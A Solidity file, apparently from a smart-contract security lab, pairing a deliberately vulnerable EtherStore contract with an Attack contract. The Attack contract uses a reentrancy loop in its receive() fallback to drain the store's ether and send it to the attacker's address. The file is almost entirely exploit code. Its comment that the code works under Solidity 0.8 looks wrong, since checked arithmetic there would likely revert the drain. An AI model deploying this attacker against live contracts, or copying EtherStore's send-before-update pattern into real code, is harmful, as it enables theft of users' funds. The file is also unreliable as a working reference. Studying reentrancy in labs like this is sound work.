//inspired https://github.com/UHMC/module-9-lab-beginner/tree/master
pragma solidity ^0.8.0;
// this code also works with older solidity
/*pragma solidity ^0.4.19;*/
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks);
         (bool success, ) = msg.sender.call{value: _weiToWithdraw}("");
         require(success, "xxxxxxxxxx");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }
 }


 contract Attack {
    EtherStore public etherStore;
    address payable public owner;


    // intialize the etherStore variable with the contract address
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        owner = payable(msg.sender);
    }

  function attackEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds{value: 1 ether}();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
    //   msg.sender.transfer(address(this).balance);
    // uint256 amount = address(this).balance;
    // address(this).transfer(amount)
    owner.transfer(address(this).balance);

    //  bool sent = owner.send(msg.value);
    // (bool sent, bytes memory data) = owner.call{value: msg.value}("")
  }

  // fallback function - where the magic happens
  receive () external payable {
      if (address(etherStore).balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
